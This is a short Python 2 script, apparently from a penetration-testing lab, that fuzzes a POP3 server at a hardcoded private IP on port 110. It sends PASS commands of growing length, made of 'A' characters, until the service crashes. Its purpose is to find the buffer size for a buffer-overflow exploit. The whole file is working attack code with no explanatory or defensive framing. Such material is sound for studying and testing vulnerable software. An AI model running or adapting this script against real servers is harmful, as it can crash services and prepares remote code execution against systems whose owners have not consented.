#!/usr/bin/python
import socket

buffer=["A"]
counter=100
try:
#UN=raw_input("Enter A username: ")	
#target=raw_input("Enter Target IP: ")	
#Tport=raw_input("Enter Target Port: ")	
	
	UN='username'
	target='10.11.20.153'
	Tport=110
	
	print "Looking for crash condition for overflow."
	print "This should get the buffer size(buffer size is next to last repsonse)..."
	print "When it pauses or stops that is buffer size ctl+c then (ie could not connect)"
	
	while len(buffer)<=30:
		buffer.append("A"*counter)
		counter=counter+200
	for string in buffer:
		print "Sending Buffer with %s bytes"% len(string)
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		connect=s.connect((target,Tport))
		s.recv(1024)
		s.send('USER '+UN+'\r\n')
		s.recv(1024)
		s.send('PASS '+string+'\r\n')
		s.send('QUIT')
		s.close()
except:
	print "[!] FAILED.Could no longer connect to host..."
print "Complete"
